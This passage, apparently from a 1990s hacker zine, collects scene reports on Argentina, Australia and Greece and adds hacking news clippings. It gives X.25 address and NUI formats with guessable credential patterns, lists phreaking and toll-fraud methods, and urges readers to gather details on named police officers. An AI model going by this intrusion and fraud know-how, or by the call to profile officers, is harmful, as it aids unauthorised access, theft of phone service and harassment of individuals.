    ( 5x240Khz + 32Khz.) in the 812-2044Khz. band
  - Super Master Group (SMG):
      3MGs, 3x300 = 900 channels
      3 x 1232Khz + 176  Khz = 3872 KHz bandwidth. (8516-12388 KHz)

  For digital multiplexing, using TDM, things are like this:
  Pulse amplitude modulation (PAM) is first used to sample the 4Khz
  channel, then the PAM signal is quantified in 256 discrete values
  ( 8 bits) and this is finally multiplexed as follows:

  -   A basic 2048 Mbit/s for 30 channels  (8Khz/channel for they&#039;re sampled...)
  -   8 Mbit/s = 4x2Mbit/s   (  120 channels)
  -  34 Mbit/s = 4x8Mbit/s   (  480 channels)
  -  52 Mbit/s = 6x8Mbit/s   (  720 channels) &lt;--this is not standard)
  - 140 Mbit/s = 4x34Mbit/s  ( 1920 channels)
  - 565 Mbit/s = 4x140Mbit/s ( 7680 channels)
  - 900 Mbit/s = 6x140Mbit/s (11.520 channels)

 Both DC and AC is used for signalling depending on several characteristics
 as trunk length, the switch&#039;s technology, etc.
 Reverse polarity and E and M signalling is used with DC, while DP
 and MF is used with AC. CCITT #3,CCITT #4 or CCITT #5 is used
 on international circuits, otherwise R2 is used.
 I won&#039;t go into the details of the different in band signalling methods as they
 are probably well known by you... i&#039;ll only point that, as you guessed,
 things are set for interesting boxing experiences.
 Argentina is the place for the casual explorer in this topic, even &quot;Joe
 customer&quot; could choose alternate routes for his local calls, all by
 himself, some years ago, prefixing the destination DN with a 3 digit number.
 There are other interesting things to ponder here, like the way calls
 from one company&#039;s zone to the other company&#039;s zone are completed, etc.
 Also, SxS and Xbar switches are fun to mess with, known their &quot;hidden
 features&quot; like line freezing, forced ANIF and forced linkage of the
 circuit to a given CO.

 Payphones, known as TPAs in local telco. jargon, comes in different
 flavors. First, the one that both companies inherited from their
 predecessor, Entel, this one sports a rotary dial and needs tokens to
 operate.

 Then the obsoleted Telecom&#039;s &quot;card puncher&quot;, needed a card with a mag
 strip that the phone would punch each time you used it, these have been
 replaced by the new Telecom&#039;s modular payphone. (Perhaps it was a piece of
 shit and Telecom replaced them right away??? ). You wont find one of these
 easily.

 Telecom&#039;s modular payphone works with cards and wont accept tokens or
 coins, these have a cute LCD and controls for volume, language selection
 of the messages displayed as well as buttons for redialing and replacing
 an exhausted card while a call is in progress. It&#039;s uses cards with an
 8 contacts on-card chip.

 Telefonica&#039;s payphones accept cards AND tokens, they also have a LCD
 and buttons for volume, redial, etc. They also use cards with 8 contacts
 on-card chip. They skipped the &quot;brilliant&quot; card punching stage so these are the
 phones you&#039;ll find in Telefonica&#039;s area.

 NO PAYPHONE WILL ACCEPT REGULAR CREDIT CARDS.
 ONE COMPANY&#039;S PHONE CARD IS INCOMPATIBLE WITH THE OTHER COMPANY&#039;S PHONES.
  ( this is supposed the change this year? )
 Phone cards cant be recharged when they&#039;re exhausted.
  ( eh, this is not quite true )
 Telefonica is said to make their payphones accept regular coins any
 time noooooooowwwwwwww bahahahahahahah .

The Networks
~~~~~~~~~~~~

  Networks in Argentina are growing, and are growing fast, but they are
  still poor and slow when compared to other countries nets.
  LAN are usually based on PCs with Novell&#039;s Netware in its different
  flavors or some lousy Lantastic.
  As for WANs, the computers you&#039;ll ran into are IBM mainframes, DEC
  VAXes running VMS, and Unixes (generally IBM&#039;s RS/6000 w/AIX or lower
  end PC clones running SCO).
  Still, open systems are being happily adopted and TCP/IP based LANs are
  emerging everyday.
  There aren&#039;t many systems online 24hrs/day but mostly online during work
  hours. You&#039;ll find most systems unreliable, bad configured, and worse
  used.

  ARPAC, The Jester&#039;s Playground
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     ARPAC (DNIC==7222) is the most known PSN in Argentina. It has dialup
     access in more than 30 cities in the country, although the fastest
     baud rate for them is an infamous 2400bds.  Leased lines go
     up to a maximum of 19.2Kbds.
     The protocol used is the X.25 suite and ARPAC offers the following
     optional facilities:
     - Closed User Group. (CUG)
     - Fast Select.
     - Packet size negotiation.
     - One-way logical channels. (outgoing/incoming).
     - Non-standard window sizes.
     - Reverse charge request and acceptance.
     - Multipoint access
     - Incoming/outgoing call blocking.
     - Incoming/outgoing call blocking to and from CUGs.

     Obviously these features, should you accept them, imply a little
     extra bucks in your Arpac bill (which will self-destroy your wallet in
     five secs.).
     Startel, the company that runs ARPAC, uses a unit called PTD (it stands
     for Data Transmission Packet in Spanish) for billing purposes.
     Packets are 128 bytes and conform a PTD, transmission of 64 bytes or
     less are considered as 1/2 PTD.
     Startel vacuum cleans it&#039;s customers bank accounts this way:
     1) A one time payment for the installation of the X.25 equipment.
     2) A &quot;basic monthly payment&quot; that does not include data traffic.
     3) A &quot;variable monthly payment&quot; that depends on the number of PTDs
        handled by Arpac.

     As for December 1993 this was calculated considering a fee of $0.007595/PTD
     and 1 PTD/min for leased lines + 4 PTD/min for dialup access. Also
     remember that those dialing from the PSTN are paying the local call
     too.
     There are discounts based on the day of week and hour of the
     connection:
     - Type &quot;A&quot; fee (normal fee)            Mon-Fri   06:00-20:00
     - Type &quot;B&quot; fee (40% discount)          Mon-Fri   20:00-24:00
     - Type &quot;C&quot; fee (60% discount)          Mon-Fri   24:00-06:00
                                            Sat.      20:00-06:00
                                            Sun. and
                                            Holidays  00:00-24:00

     International connections are not considered in this figure and are
     billed according to Telintar (LD carrier) fees.
     A 8% or 18% tax is applicable to all payments. Customers can also
     choose a fixed monthly payment instead of basic+traffic payments.

     The software used is that of ITAPAC (DNIC 2222) and as far as i know
     theres no support to mnemonics instead of the plain X.121 addressing.
     Nuas are DNIC+10 digit composed this way:

      [07222]XXXX YYYYY PP
             ^^^^\^^^^^\^^\__  port/subaddress
                   \     \
                     \     \_  host
                       \
                         \ __  corresponds to a &quot;nodal area&quot; in Startel&#039;s
                               jargon,usually associated with geographic
                               location.
                               Some valid entries here are:
                                2111,2141,2171,2511,2211,2911,2172,2912...

    NUIs, IURs in Startel&#039;s babbling, are formed like this:

    9XXXXXXXX/YYYYYY
     ^^^^^^^^\^^^^^^\_ this is the password, normally 5/6 alphanumerics,
               \       all uppercase.
                 \
                   \__ da nui! X is in the [0-9] range and generally the whole
                       8 digits correspond to one of the subscriber&#039;s DNs.

    So if you were to use ARPAC you&#039;d make a call by typing

       .. &lt;enter&gt; upon connection (7E1, &lt;= 2.4kbds)

      then

       N9&lt;XXXXXXXX&gt;/&lt;YYYYYY&gt;-&lt;nua&gt;   ; when using a NUI. or

       &lt;nua&gt;                         ; w/o NUI needs Reverse Charge
                                     ; Acceptance of course.

    You don&#039;t wanna call them NUIs when talking to Startel personnel
    (i.e. social  engineering)  unless you want to become instantly suspected
    to be an evil phraudster (aka haq3R).

  &quot;CIBA&quot;, The Infamous, or BT Tymnet&#039;s retarded child (DNIC==7220)
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    If you cared enough to read the BT Tymnet&#039;s worldwide dialups listing
    you probably noticed a few entries for Argentina. These were regularly
    used by &quot;net explorers&quot; in the mid 80&#039;s and were known as &quot;CIBA&quot; among
    them. CIBA dialups are 300bds (wow!) and use CCITT v.21 protocol (ATB0
    for your modem). At that time the fastest ARPAC dialup was 1200bds.
    All in all CIBA is nothing more than the door to BT Tymnet in
    Argentina (node 7407, host 1212). There&#039;s no direct access to interesting
    utilities such as &quot;xray&quot; and the likes.
    NUIs here were stupidly choosen and easily scanned since they followed
    two known patterns:
       naargXXXXna , and
       enargXXXnet  X being in the [0-9] range.
    Many of these were not passworded. Of course no one would even think to
    scan NUIs at 300bds nowadays...

  Internet
  ~~~~~~~~

    The Internet is rarely know and even less used in the student,
    professor, computer and communications professionals circles. It&#039;s a
    depressive experience to explain the workings of &quot;telnet&quot;,&quot;rlogin&quot;,&quot;ftp&quot;
    and such &quot;eccentricities&quot; to people who were supposed to know about them
    from their TCP/IP books, courses and lectures. You, reader, could
    allege that a networked unix system is enough to explain this, but
    despite the technical explanations, the political, economic and social
    implications of the Internet will remain unknown until a vast amount of
    persons actually USE and EXPERIENCE it. And I&#039;m not talking about
    &quot;Joe citizen&quot; here, I&#039;m talking about people that would actually NEED
    the net if they were to improve their work.
    It&#039;s like describing the taste of an apple to someone, he&#039;ll
    surely understand what you say but don&#039;t expect him to understand what
    it tastes like until he actually bites it.

    The Internet top level authority in Argentina is the Foreign Relations

    Argentina has only an UUCP link (well, once again this is just the publicly
    known info...) to the Internet through UUNET, connecting several uucp
    linked networks to it (RAN,RECYT,etc). Atina.ar is the most important
    host in this scheme, seconded by the Science and Technology Secretary&#039;s
    host (SECYT) and the University of Buenos Aires (UBA) host located at
    the Exact and Natural Sciencies Faculty in a dependency known as the
    &quot;CCC&quot;.

    There are other links that bypass atina and uunet, all of them part of
    corporate networks. (i.e. IBM&#039;s VNET, etc)

    Although everyone says theres only a UUCP link to the Internet, word is
    that there are a few hidden 9600bds leased lines shared among many hosts
    at some sites, at any rate this is completely insufficient for servicing
    researchers, students and other interested parties, thus the existence
    of these links is kept as a sort of secret.

    64kbds links are supposed to be installed  for interactive sessions
    this year at certain sites.

  Other networks
  ~~~~~~~~~~~~~~
    Many companies form their corporate networks as CUGs on Arpac, have
    their own network, or both. Telcos, consulting firms, banks and
    insurance companies fall in these categories  and are quite interesting
    research projects for the inquisitive hacker.


The &quot;Scene&quot;
~~~~~~~~~~~
    There&#039;s not much to say about the Argentinian scene. Given the cost
    and the time you have to wait to get a phone line installed there
    aren&#039;t many BBSes up 24hrs. Most of them are up during nighttime, from
    10:00/11:00 pm to 6:00/7:00am, of these, very, very few are dedicated to
    hack/phreak topics.
    Also, considering that theres no decent internet access at your local
    university you would be forced to explore X.25 networks in order to
    fulfill your natural interest and seek of knowledge.
    But there aren&#039;t many hackers either. Most Argentinians you&#039;ll find on
    the nets are mere abusers with one final goal: to get to QSD or the
    likes. While this sounds rather amusing (eh) there&#039;s an explanation to
    it.
    In the mid 80&#039;s a few Argentinians used to exploit CIBA&#039;s clueless
    procedures for choosing NUIs. At that time the fastest ARPAC dialup
    was 1200bds so 300bds was not that bad after all, and not bad at all
    as you were sure you could find a new NUI in a matter of hours.
    Yes, many people wasted their diminishing lifes in QSD, but for some this
    new x.25 thingie was more than a mean for meeting friends over the net
    and having endless chats with them, some needed to learn and understand
    the workings of the nets and the many different systems hooked to it.
    For those the place was Altos, and AMP (although you couldn&#039;t connect to
    PSS directly). And Altos proved to be of great help for Argentinians
    that got introduced to the hack/phreak world not on a BBS but right on a
    X.25 network. And so did the sequel of Korn-chat sites (tchh,lutzifer,
    italian &quot;artemus&quot;) or even Pegasus and LINA sometimes.
    Around &#039;89 or &#039;90 an Efinet (Efinet == Fidonet wannabe) meeting was held,
    and during it someone gave out a &quot;strange bunch of numbers in the form
    of some sort of code or something&quot; (this being an ARPAC NUI followed by
    QSD&#039;s NUA) and the attendees ran home and tested it, just to see them
    connected to the France chat extrordinaire. Meanwhile, things were
    getting hot elsewhere in the world, and those once famous X.25 hangouts
    went virtually dead, so these newcomers wouldn&#039;t get in touch with
    Argentinian hackers (as they wouldn&#039;t appear in QSD) or other countries&#039;
    hackers (as they were having a bad time or retiring or simply leaving
    X.25 alone). So, even if they wanted to learn, these freshmen, for good or
    for bad, were on their own and still are...

    The vast majority of the argentine society never heard the words &quot;hacker&quot;
    or &quot;phreaker&quot; or, if they did, they relate it to things happening in
    other countries, far, far away.
    It wasn&#039;t until &#039;93, in accordance with the apparently boundless tendency to
    use the word &quot;cybersomething&quot; when referring to anything remotely related to
    new technologies, computers, or scifi novels or any other thing that
    requires publicity, i.e. see cyberIdol&#039;s cybershitty cyberCD to understand
    what I cybermean, uhg excuse me, back to the point...
    It wasn&#039;t until &#039;92 or &#039;93 that the media discovered this brilliant trend
    for selling more and more, apparently some genius said: &quot;Hey, what if we
    sell the future? What if we write about how will life be, how  will
    technology be, how will the planet be, how will your dog be? All this
    with some vague journalistic odor of course. I bet we will sell more!&quot;.
    So they did, and in this frame the hacker/phreak scene is more like the
    salt to dress the salad, yet things didn&#039;t get to the extreme of
    sensationalism and hacking is portrayed as an activity bound to some
    new sort of romanticism, still things are very much confused, putting
    hackers, phreakers, crackers, pirates, virii authors and mere fraudsters all
    together in the same bag (yes, but what would you expect anyway?). Even some
    interviews to an ex-hacker (who now runs a data security firm), and a
    self proclaimed &quot;expert&quot; ( more a virus expert, IF anything) have
    appeared.
    On the other side,  many &quot;eleet poseurs&quot; have appeared too, but as one
    could expect, they are nothing more than mere poseurs and certainly not
    worth more than a phrase here.

Final Words!
~~~~~~~~~~~~
    This is the &#039;scene&#039; AS I SEE IT, i don&#039;t consider myself an enlightened
    entity, thus I acknowledge my description might not be objective nor
    complete (in fact it might be complete bullshit but, do I care? do YOU
    care?).
    Argentina is a country where lots of things are still there, waiting to
    be discovered, virgin beaches for you to explore and enjoy. Security is
    generally lax, and people is generally not security-aware and even less
    hacker-aware, trashing and social engineering are simple things that DO
    give many benefits.
    As far as I know theres no specific law dealing with computer related
    crimes (whatever that mean...), and as long as you don&#039;t get yourself
    involved in the traditional crime pictures you are pretty much safe.
    On the other hand, the bad and expensive phone service, the lack of
    internet connectivity and the limited number of BBSes dedicated to the
    so called &quot;underground&quot; (yes, I did it, I used the damned word, argh)
    make things tougher for newcomers.

    Perhaps the most interesting thing is that there&#039;s not much knowledge of
    what hacking/phreaking means and this gives us an unique opportunity to avoid
    misunderstandings and errors that occurred in other countries. Perhaps
    it is possible to influence people in a positive way, making them think
    about secrecy, security, privacy and responsibility issues. We are
    still free of Geraldos, we didn&#039;t suffer witch hunts ala Operation
    Sundevil, the words &quot;hacker&quot; and &quot;phreaker&quot; have not been demonized yet,
    although the Orwelian-way is common practice among the telcos, but
    nobody seem to give a fuck about this, or maybe nobody notice?.

    So, this is it, the file has come to an end and I think it&#039;s enough
    for an introduction, I did not cover cellular telephony nor satellite
    links and companies providing related services, I did not mention many
    other things but my intention was to write a description of how things
    are here, not a fucking encyclopedia.

    in deep, that some information might be not accurate or if you don&#039;t
    agree with anything I&#039;ve stated you can contact me at:

               The
           Australian
           Underground
     ( or The lack thereof! )

               by

            Data King


ATTITUDE

For several years now the Australian underground scene has turned better yet
worse at the same time. The amount of companies and colleges using datacomm
has dramatically increased. In my opinion it is still not yet to the stage of
America in this respect though.

The number of &#039;hackers&#039; has increased, but I use the term loosely as I do not
consider many of these so called &#039;hackers&#039; to be hackers. Why do I say this?
I say this because most people who hang out in the underground scene in
Australia consider hacking to be getting an account at a university off of a
friend and then snarfing the password file and running crack over it. They are
only interested in things that will give them access to IRC, FTP &amp; Newsgroups.
( No flames please I am talking in general here! )

Many of them have never heard of services like MIDAS, Minerva &amp; AUSTPAC and
even if they were given a dialup to one of these services I doubt they would
have a clue about how to use it. We have a wealth of services out there just
waiting to be tried, but there is almost no one who is interested in doing so,
to give you an example. One night I was working away on my box at about 3am and
a &#039;hacker&#039; mate had crashed on the couch. I went to dial into one of the local
universities and I misdialed the number.  At first I didn&#039;t realize that I had
dialed the wrong number since I got a carrier. My modem connected and then just
sat there instead of the usual annex prompt. I bashed the old enter key a
few times and suddenly I was presented with a menu to an accounting system.

&#039;Sheet,&#039; I thought, and screaming to wake my mate up ( at this stage I thought I
had connected to the university and it hadn&#039;t reset the line after the last user
hung up ) I started to explore the system, it soon became evident that it wasn&#039;t
the university but something entirely different, by this time my &#039;hacker&#039; mate
had woken up. &#039;Whaaaaaaaaat?&#039; comes the response from the couch, I briefly
explained what had transpired and his only response was &#039;Ughhhhh&#039; as he went
back to sleep. Needless to say I spent the next 3 hours playing with the
system, and by the time I had finished I could crash the accounting menu and
exit to the operating system.

The system turned out to be fairly boring and proved to be of no use to me,
BUT I had to assume that before I knew, it could have been something really
interesting and to spend time fully exploring it, where as my &#039;hacker&#039; mate
couldn&#039;t give a stuff, &#039;coz it wasn&#039;t on internet&#039;.

TECHNIQUES

Australian Hackers no longer seem to be using advanced techniques to penetrate
a system, very few would have any idea how to use TCP/IP to gain access to a
system. Most satisfy themselves with obtaining an id elsewhere and then
snarfing the password file and running crack over it. When it comes to things
such as VMS the attitude I usually encounter is &quot;VMS urgh, what bloody good
is it!&quot;. There are some very good Hackers in Australia but most of them do
not hang around in the underground scene, rather they are usually university
students who learn how to make the best use of the system. Writing things like
ICMP bombs, and Sniffers is usually left to these people, in fact I can not
think of any active non university student hacker who lives in Australia and
uses these sort of techniques.

CONS

To the best of my knowledge there has only ever been one underground conference
in Australia, and that was from memory in 1984, it was called Hackfest and it
was nothing compared to HOHOCON or Hacking at the End of the Universe.

At the time we all thought it was great, and I must admit it did boost the
sharing and finding of new info for a while.

I, in association with  one or two others, have been thinking of arranging
another Hackfest to be held in 1994, it will probably be held in Melbourne,
Australia. If you live in Australia and would like to attend then mail me
and I will keep you informed. ( Det. Sgt. Ken Day: Don&#039;t bother trying to
spy on Hackfest if it goes ahead, you&#039;re more than welcome to attend! )

NETWORKS

In Australia we have several national and international networks, here is a
list of some of them:

MIDAS       International Packet switching network DNIC = 5053
Minerva     Automated Office Network w/ International PSS
AUSTPAC     Australian Packet Switching Network DNIC = 5052
SprintNET   Need I explain this???
AARNET      The Australian Network that covers Internet in Australia
TRAN$END    Subset of Austpac ( used by Banks for ATM/EFTPOS transmissions )
Compuserve  Need I explain this???
Discovery   Australian Videotext system ( Not sure if still in Service )
?????       The Australian Military Network ( Don&#039;t know its name )
TAXLAN      The Australian Tax Office ( IRS ) Network

PHREAKING

For years people in Australia believed that phreaking was only really possible
by pitting, this included Telecom Investigations Department, but we know that
this is not true. Methods that have been used in Australia include:

Blue Boxing off of an American Operator Line
Pitting ( ie: Linemans handset connected to a telecom junction box )
Clicking ( Electric shock to a public phone )
Boxing off of a disconnected number ( almost impossible now )
Calling Cards ( both American and now Australian Calling Cards )
PBX&#039;s ( 0014-800&#039;s and local PBX&#039;s )
Mobile Telephones ( ie Cellular Phones and b4 that the old Radio mobiles )

There are probably other methods as well but I am not a phreaker so I am not
the best person to comment on this. Boxing in Australia is getting dangerous
now as we are getting more and more of the new digital exchanges which make it
a lot easier to trace, or at least so I am told.

There were some people in South Australia making/recharging Telephone cards,
( Like a disposable calling card, but you buy them in news agents and they
have a dollar value, once used up you throw them away ) but these people were
apparently caught and telecom have taken measures to ensure that this is no
longer possible.

VMB&#039;S

We have a large range of VMBs in Australia, and with the proliferation of
VMBs has come the art of Hacking VMBs, we even have people here in Australia
that do virtually nothing else other than play with VMBs. These people tend
to go a lot further than just cracking the pin numbers, some of them have
learned enough about the signalling systems used by these systems to virtually
take control of the system and make it do what they want. Once again this is
an area that I do not know a lot about.

We also have a couple of individuals that run something called the Scene Inpho
line, Which essentially is a VMB with a long recorded message giving out tips,
rumors, and general rubbish. The number to the Scene Inpho Line unfortunately
constantly changes as the owners of the VMB notice what&#039;s going on and shut
that particular box down.

BULLETIN BOARDS

There are not a lot of good underground BBS&#039;s in Australia, a couple that I
know of that come to mind are Destiny Stone II, Empire of Darkness,
&amp; Watchtower. I can not comment on Destiny Stone II as I have never called it.
However, when I used to called Empire of Darkness it was so lame it wasn&#039;t funny
and now he has gone 96+ only I can&#039;t call it ( I&#039;m poor and can&#039;t afford a
new modem ;) ).

Watchtower showed potential but unfortunately the sysop of it is very slack and
needs to get off of his butt and do some work on it! The underground boards in
Australia tend to reflect the general state of the scene, ie: complete and total
apathy!

Most H/P boards in Australia are also warez sites and tend to be pretty lame and
insecure because of all the warez puppies on them, I can not think of a really
good board in Australia that is still operating.

BUSTS

In the last year the Australian Federal Police, Computer Crimes Unit has been
quite busy raiding people. As a result there have been 4 convictions that I
know of, and another 2 people waiting for charges to be laid.

The people convicted and there sentences are as follows:

Data King (me) Guilty but no record ( escaped conviction under section 19b of
               the act ) $300.00 fine and $500 2 year Good Behavior bond.
               ( Pleaded Guilty to 2 Charges )

Electron       6 Months Jail ( suspended sentence ), $500  6 Month Good
               Behavior bond, &amp; 300 hours Community Service Work.
               ( Pleaded Guilty to 14 Charges )

Nom            6 Months Jail ( suspended sentence ), $500  6 Month Good
               Behavior bond, &amp; 200 hours Community Service Work.
               ( Pleaded Guilty to 2 Charges )

Phoenix        12 Months Jail ( suspended sentence ), $1000 12 Month Good
               Behavior bond, &amp; 500 hours Community Service Work.
               ( Pleaded guilty to 15 Charges )

In the most part people get busted in Australia due to either their stupidity
( Hi Phoenix! ), being lagged in by some low life, or by trusting someone they
should not of ( Hi Phoenix! ).

LEGALITIES

Both Hacking and Phreaking have been illegal in Australia for quite a few years
I will not go into details here as hopefully there will be an article in this
issue of Phrack covering the laws and possible penalties.

Computer Crime in Australia is the responsibility of the Australian Federal
Police Computer Crimes Unit. The people known to us in this unit are:

Det. Sgt. Ken Day
Det. Neil Campbell
Det. Steve Visic

( Sorry guys if I spelled your names wrong - NOT! ;) )

If you are able to add any names to the list, please mail them to me and any
other info you have on them. That way we can begin to build up a dossier on
our enemies!

PUBLIC

There seems to be a growing awareness in the general populace of Australia.
There has been quite a bit of media hype on hacking over the last year, and
slowly the public seems to be getting a great fear of hackers. To me it seems
ridiculous, as the only real hackers that the public should have feared lived
in the early 80&#039;s. Today&#039;s generation of Australian hackers are pretty HOPELESS
in my humble opinion. To give an example, when Electron, Nom, &amp; Phoenix&#039;s court
cases were getting media attention I was sitting in my parent&#039;s lounge room one
night when the news was covering their sentencing. My father thought that
these people were very dangerous and should have gotten a bigger sentence than
they did.  At this time he did not know about my bust. I have explained it to
him now but he still doesn&#039;t seem to understand...oh well that life I guess.

This is how I see the Australian scene, If you disagree, want to comment, send
me info for future articles, get on the hackfest mailing list, or just want to
have a chat you can mail me at:

                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Part VIA - Offences Relating to Computers

Section 19B (1) Order &amp; Recognizance

The Court can discharge you under this section, with a surety and/or
recognizance given by you.

If discharged under this section you may be put on a good behavior bond
of up to but not exceeding 2 years. Other conditions may be placed on you
by the court also, this conditions can be anything that the court considers
appropriate.

To have this section come into effect the following must apply:

The Court is satisfied that the charge(s) are proved, but is of the opinion,
having regard to:

 The Character, Antecedents, Age, Health, &amp; Mental Condition

that it is unexpedient to inflict any punishment or any punishment other
than a nominal one on you.

Basically what this means is that you can be found guilty and not have a
conviction recorded against your name, but you must realign that the
department of public prosecutions may object to this and then you will have
to try and convince the Judge to ignore what the DPP says, (not easy).

Also please realign that if you were to receive a section 19B and then were
caught doing naughty things again and you are still under your good behavior
bond, you will forfeit your bond and have to stand trial again for the
original offence(s).

You may have noticed that any hack of a Computer in Australia could result in
you staying in a prison for quite a long time, as almost any hack would be
and offence under just about all of the subsections listed above, combine this
with a consecutive sentence and you *COULD* be in jail for over 25 years.

                          &quot;Be Careful Out There!!&quot;

By mistake probably.

 Agricultural country, light industry, member of the European Community, ten
million residents, surrounded by sea (polluted in some areas) and forests
(burned in some areas). Four thousand years old culture, beautiful language
(due to it&#039;s ancientness) [...]

 Digital subculture scene?  Quite a few articles appear on newspapers and
magazines about CyberPunk.  Quite a few people claim to be hackers (elite ones),
crackers (elite ones), phreakers (elite ones) and coders (elite ones).
University students get insane pleasure when talking about their last
achievements, how they cracked all the accounts of a shadowed password file,
and how they transferred 2000 true color, porno JPEG and phracking files.
Public bulletin board systems distribute blue boxing related articles (Hail
Mark Tabas!) and pirate boards distribute &quot;oNE DaY WAREZ!@!#&quot;.

 &quot;Phone freaks, crackers, hackers, virus makers.&quot; At the end, an interview
with a young software cracker.  He listens to TECHNO (&quot;the only real music&quot;),
he would like to buy an Apple Powerbook and he needs only five minutes to
&quot;crack a disk&quot;.

 No busts have taken place AS FAR AS I KNOW. Only innocent pirates and couriers
were prosecuted years ago, due to distribution of cracked programs for ZX
Spectrum, Commodore and Amstrad (&quot;peeks, pokes, hints &amp; tips&quot;).

 An article about &quot;Legion Of Doom! - ComSec&quot; appeared on November 1991:
&quot;X-Hackers offer their services to companies&quot;. Glamorous picture of the
group, opinions, history, comments from a phracking illiterate journalist.

 An-archic &#039;zines (printed format) were publishing digital underground related

 At the age of seventeen Nikos Nasoyfis wrote a book about 8088/8086 assembly

 Until the end of the year a free experimental 2400bps ( 1200 baud + MNP 5 )
dial up public service will be operating at 0961-11111 (if you call this a
2400 baud NUI, shame on you!  You know who you are :-) ). 0961-22222 will
lead to HellasTel ( Video Text ).  Can&#039;t tell if foreigners can call these
numbers.


 SERVICE: ARIADNET

 Ariadnet is a Hellenic research/academic network sponsored by the European
Community. There are two main hosts: LEON and ISOSUN. The first one serves
the public; dial-ups, low cost (10.000 drg for three months), yet low disk
quota (starts from 1 MB) due to &quot;the workstation&#039;s incapability to carry
a lot of hard disks&quot;. The second one serves users who call from other
sources (i.e. PSDNs). Thanks to Ariadnet most universities provide free
internet access (usually they reach 1 KiloByte per second) in conjunction to
restricted HellasPac access (a.k.a. high expenses).

The following captures will talk by themselves.

* Phone Network


 The last four years or so, the old analog switching centers (HDW, Rotary,
Crossbar) are being replaced with digital ones (Ericsson-Intracom AXE-10
and Siemens EWSD).  Theoretically that should be completed by the end of 1994
(according to the Christian way of chronometry).

 These provide the following for the masses:

    PAGING (was operating anyway)
    HOT LINE
    &quot;WAKE-UP&quot; SERVICE
    ABBREVIATED DIALLING
    THREE PARTY SERVICE
    CALL WAITING
    &quot;DOT NOT DISTURB&quot; SERVICE
    OUTGOING CALL BARRING
    MALICIOUS CALL IDENTIFICATION
    ABSENT SUBSCRIBER SERVICE
    LINE HUNTING
    TOLL TICKETING (sure they do!)

 ...and of course better control OF the masses FOR the state.

 I got very interesting results exploring those new centers. If I ever finish
the project it will appear in Phrack or UPi (hopefully). Damn...Better to
think over that twice.  Abusing raises eyebrows.

 The country direct numbers use the 00-800-country code-11 format. Believe it
or not; I had to social engineer the directory assistance operator to start
moving.  Not to mention the time and examples he needed to understand what I
was talking about. Bad luck?

     FINLAND                00-800-358-11
     CYPRUS                 00-800-357-11
     ICELAND                00-800-353-11
     BRITAIN/NORTH IRELAND  00-800-44-11

     AT&amp;T                   00-800-1311

 As of now only U.S.A. direct numbers can be used for blue boxing. It was
possible to do so and it should be possible nowadays, although I cannot
confirm that.  The last months I have spent A LOT of time scanning numbers
and frequencies but I didn&#039;t come to an end.  To be continued...


* Cellular Phone Networks


 The pen-European digital (shit!) mobile telephony system G.S.M. is being
implemented. Nothing is solid yet and of course no one claims (trumpet fanfare
added here) that phreaks out through that. In the first state PANAFON will
cover Athens and Argosaronic and afterwards all the big cities: Thessaloniki
(it should be functioning by now), Patra, Heraklio et cetera. They are planning
to cover more than 90% of the country&#039;s residents and 75% of the geographical
region. Problems appear thanks to the strange terrain. I don&#039;t know what is
going on with TELESTET.

 The total registered subscribers are considered to be about ten thousand.


* Miscellaneous


 An Integrated Service Digital Network is being established and local
universities are installing [optical] Fiber Distributed Data Interfaces.
PBXs are now becoming popular.

 Most operators know little or nothing on computer security or managing in
general. That&#039;s why some of them accept offered help and provide afterwards
(non-privileged) accounts and old, yet valuable, duplicate manuals. If some
anti-hacking measurements are taken, that is thanks to the company employers
who maintain and prepare the systems.

 Do not hang on this, but I think that there are no laws concerning H/P in
particular.

 Needless to say that no conferences take place. Of course QSD &amp; IRC...ohhh
fuck it.

Paramount&#039;s Hack Attack                                      March 3, 1994
~~~~~~~~~~~~~~~~~~~~~~~
Reuter News Wire

Though the minds of Paramount execs have surely been n potential whackings,
computer hacking was the chief focus of execs Bob Jaffe and John Goldwyn
last week.

The execs got Par to pay a low six-figure fee against mid-six figures to
Johnathan Littman for the rights to make a movie from his Sept. 12 LA Times
Magazine article &quot;The Last Hacker,&quot; and major names are lining up to be
involved.

It&#039;s the story of Kevin Lee Poulsen, a skilled computer hacker who was so
inventive he once disabled the phone system of KIIS_FM so he could be the
102nd caller and win the $50,000 Porsche giveaway.

Poulsen was caught and has been in jail for the last three years, facing
more than 100 years in prison.

It was a vicious tug of war between Touchstone, which was trying to purchase
it for &quot;City Slickers&quot; director Ron Underwood.

Littman, meanwhile, has remained tight with the underground community of
hackers as he researches his book.

That takes its tool.  Among other things, the mischief meisters have already
changed his voice mail greeting to render an obscene proposal.

Hacker Attempts To Chase Cupid Away                      February 10, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UPI News Sources

Two bachelors who rented a billboard to find the perfect mate said Thursday
they had fallen victim to a computer hacker who sabotaged their voice mail
message and made it X-rated.

Steeg Anderson said the original recording that informed callers
how they may get hold of the men was changed to a &quot;perverted&quot; sexually
suggestive message.

&quot;We are getting calls from all over the country,&quot; he said.  &quot;So we were
shocked when we heard the message.  We don&#039;t want people to get the wrong
idea.&quot;

&quot;It&#039;s rare, but we&#039;ve seen this kind of thing before,&quot; said Sandy Hale, a
Pac Bell spokeswoman.  &quot;There is a security procedure that can prevent this
from happening, but many people simply don&#039;t use it.&quot;

AT&amp;T Warns Businesses                                     December 8, 1993
~~~~~~~~~~~~~~~~~~~~~
Business Wire Sources

AT&amp;T urges businesses to guard against increased risk of toll-fraud attempts
by hackers, or toll-call thieves, during the upcoming holiday season.

Last year nationwide toll-fraud attempts increased by about 50 percent during
the Christmas week.  Hackers &quot;break into&quot; PBXs or voice-mail systems, obtain
passwords or access to outside lines, and then sell or use the information to
make illegal international phone calls.

Toll fraud cost American businesses more than $2 billion in 1993.  &quot;Hackers
count on being able to steal calls undetected while businesses are closed
during a long holiday weekend,&quot; says Larry Watt, director of AT&amp;T&#039;s Toll
Fraud Prevention Center.  &quot;Tis the season to be wary.&quot;

AT&amp;T is the industry leader in helping companies to prevent toll fraud.
Businesses that want more information on preventative measures can request
AT&amp;T&#039;s free booklet, &quot;Tips on Safeguarding Your Company&#039;s Telecom Network,&quot;

Sadomasochists Meet Cyberpunks At An L.A. Party              June 14, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Jessica Seigel (Chicago Tribune)

